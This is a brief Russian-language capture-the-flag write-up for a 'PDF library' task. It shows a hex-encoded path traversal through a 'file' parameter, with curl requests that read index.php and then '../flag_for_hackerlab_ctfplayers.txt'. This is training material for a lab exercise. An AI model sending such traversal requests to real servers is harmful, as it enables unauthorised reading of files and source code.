## Описание
Здесь Вы можете скачать любой понравившийся Вам PDF-файл. В дальнейшем библиотеку ждет пополнение.

IP: 62.173.140.174:16081


## Решение

Кодируем index.php в hex, получаем через CURL

curl "http://62.173.140.174:16081/index.php?file=696e6465782e706870"

Видим вот это и понимаем что искать нужно в директории выше

// $txt_files = array_slice(['test.txt', 'flag_for_hackerlab_ctfplayers.txt'], 0, 2); // Moved to upper directory

Кодируем нужный путь: ../flag_for_hackerlab_ctfplayers.txt в hex

Посылаем запрос curl "http://62.173.140.174:16081/index.php?file=2e2e2f666c61675f666f725f6861636b65726c61625f637466706c61796572732e747874" и получаем флаг
